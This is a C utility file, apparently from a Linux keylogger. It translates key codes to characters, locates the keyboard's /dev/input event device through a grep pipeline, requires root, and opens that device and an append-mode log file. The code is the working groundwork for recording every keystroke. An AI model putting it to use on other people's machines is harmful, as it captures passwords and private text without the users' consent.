#include <linux/input.h>
#include <stdio.h>
#include <stdlib.h> // exit()
#include <string.h> //strcmp(), strdup(), strcat()
#include <unistd.h> // geteuid()

#include "util.h"

#define ARRAY_SIZE(arr) (sizeof(arr) / sizeof(arr[0]))

/* The order of the keys is defined in input-event-codes.h (included in linux/input.h) */
static const char *key_names[] =
    {
        UNKNOWN_KEY, "<ESC>",
        "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
        "<Backspace>", "<Tab>",
        "q", "w", "e", "r", "t", "y", "u", "i", "o", "p",
        "[", "]", "<Enter>", "<LCtrl>",
        "a", "s", "d", "f", "g", "h", "j", "k", "l", ";",
        "'", "`", "<LShift>",
        "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/",
        "<RShift>",
        "<KP*>",
        "<LAlt>", " ", "<CapsLock>",
        "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
        "<NumLock>", "<ScrollLock>",
        "<KP7>", "<KP8>", "<KP9>",
        "<KP->",
        "<KP4>", "<KP5>", "<KP6>",
        "<KP+>",
        "<KP1>", "<KP2>", "<KP3>", "<KP0>",
        "<KP.>",
        UNKNOWN_KEY, UNKNOWN_KEY, UNKNOWN_KEY,
        "<F11>", "<F12>",
        UNKNOWN_KEY, UNKNOWN_KEY, UNKNOWN_KEY, UNKNOWN_KEY, UNKNOWN_KEY, UNKNOWN_KEY, UNKNOWN_KEY,
        "<KPEnter>", "<RCtrl>", "<KP/>", "<SysRq>", "<RAlt>", UNKNOWN_KEY,
        "<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>", "<Down>",
        "<PageDown>", "<Insert>", "<Delete>"};

static const char *shift_key_names[] =
    {
        UNKNOWN_KEY, "<ESC>",
        "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+",
        "<Backspace>", "<Tab>",
        "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P",
        "{", "}", "<Enter>", "<LCtrl>",
        "A", "S", "D", "F", "G", "H", "J", "K", "L", ":",
        "\"", "~", "<LShift>",
        "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">", "?",
        "<RShift>",
        "<KP*>",
        "<LAlt>", " ", "<CapsLock>",
        "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
        "<NumLock>", "<ScrollLock>",
        "<KP7>", "<KP8>", "<KP9>",
        "<KP->",
        "<KP4>", "<KP5>", "<KP6>",
        "<KP+>",
        "<KP1>", "<KP2>", "<KP3>", "<KP0>",
        "<KP.>",
        UNKNOWN_KEY, UNKNOWN_KEY, UNKNOWN_KEY,
        "<F11>", "<F12>",
        UNKNOWN_KEY, UNKNOWN_KEY, UNKNOWN_KEY, UNKNOWN_KEY, UNKNOWN_KEY, UNKNOWN_KEY, UNKNOWN_KEY,
        "<KPEnter>", "<RCtrl>", "<KP/>", "<SysRq>", "<RAlt>", UNKNOWN_KEY,
        "<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>", "<Down>",
        "<PageDown>", "<Insert>", "<Delete>"};

/*
 * Converts a key code to an ascii character.
 * @parameters key code to convert
 * @return     corresponding ascii character
 */
const char *get_key_stroke(uint16_t code, uint8_t shift_pressed) {
    const char **arr;
    arr = (shift_pressed != 0) ? shift_key_names : key_names;

    if (code < ARRAY_SIZE(key_names)) {
        return arr[code];
    } else {
        return UNKNOWN_KEY;
    }
}

/*
 * Gets the details of the keyboard from the predefined file
 * @parameters null
 * @return     the event device file
 */
char *get_keyboard_device_file() {
    static const char *command =
        "grep -E 'Handlers|EV' /proc/bus/input/devices |"
        "grep -B1 120013 |"
        "grep -Eo event[0-9]+ |"
        "tr '\\n' '\\0'";

    FILE *pipe = popen(command, "r");
    if (pipe == NULL) {
        printf("Could not determine keyboard device file");
        exit(0);
    }

    char result[20] = "/dev/input/";
    char temp[9];
    fgets(temp, 9, pipe); // temp=event3
    pclose(pipe);
    return strdup(strcat(result, temp));
}

/* Check if the user has Root Privileges */
void check_root_user() {
    if (geteuid() != 0) {
        printf("Must run as root\n");
        exit(-1);
    }
}

/*
 * Opens the keyboard device file
 * @parameters  path of the keyboard device file
 * @return      file descriptor on success, exit the code on failure
 */
FILE *open_keyboard_device_file(char *deviceFile) {
    FILE *kbd_fd;
    kbd_fd = fopen(deviceFile, "r");
    return kbd_fd;
}

/*
 * Opens log file
 * @parameters  path of the log file
 * @return      file descriptor on success, exit the code on failure
 */
FILE *open_log_file(const char *file) {
    FILE *fd;
    fd = fopen(file, "a");
    return fd;
}